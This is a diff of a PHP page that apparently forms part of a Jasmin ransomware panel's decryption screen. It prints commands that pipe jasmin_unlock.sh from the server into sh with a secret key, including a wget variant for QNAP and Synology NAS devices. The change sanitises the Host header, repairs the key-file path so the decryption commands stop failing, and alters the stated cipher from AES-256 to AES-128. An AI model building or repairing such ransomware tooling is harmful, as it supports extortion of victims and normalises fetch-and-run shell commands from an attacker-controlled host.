@@ -1,5 +1,8 @@
 <?php
 $srv = (isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']==='on'?'https':'http').'://'.$_SERVER['HTTP_HOST'];
+// Host 头可被伪造，$srv 会原样输出进 <pre>（HTML 上下文）-> 反射型注入。
+// 输出处一律 h() 转义：只保留主机名字符集，其余剥掉。
+$srv = htmlspecialchars(preg_replace('/[^A-Za-z0-9.:\-_\[\]]/', '', $srv), ENT_QUOTES, 'UTF-8');
 // 修复: __DIR__ 是 includes/，原写 __DIR__.'/payloads/.key_secret' 永远不存在
 //       → $aes_pwd 恒为 KEY_NOT_SET → 解密命令必然失败。应为上一级目录。
 $ks_path = dirname(__DIR__) . '/payloads/.key_secret';
@@ -20,7 +23,7 @@ curl -sL <?=$srv?>/payloads/jasmin_unlock.sh | sh -s <?=$srv?> "<?=$aes_pwd?>" /
 # 若 NAS 上 curl 不可用，改用 wget（QNAP/Synology 默认都带 wget）
 wget -qO- <?=$srv?>/payloads/jasmin_unlock.sh | sh -s <?=$srv?> "<?=$aes_pwd?>"</pre>
 </div>
-<div class="dt-note" style="margin-bottom:16px"><i class="fas fa-shield-alt"></i> 私钥已AES-256-CBC加密存储，解密命令自动下载加密私钥→内存解密→执行→清理</div>
+<div class="dt-note" style="margin-bottom:16px"><i class="fas fa-shield-alt"></i> 私钥已AES-128-CBC加密存储，解密命令自动下载加密私钥→内存解密→执行→清理</div>
 <div class="decrypt-tabs">
   <button class="dt-btn active" onclick="showDT('win')"><i class="fab fa-windows"></i> Windows</button>
   <button class="dt-btn" onclick="showDT('linux')"><i class="fab fa-linux"></i> Linux</button>
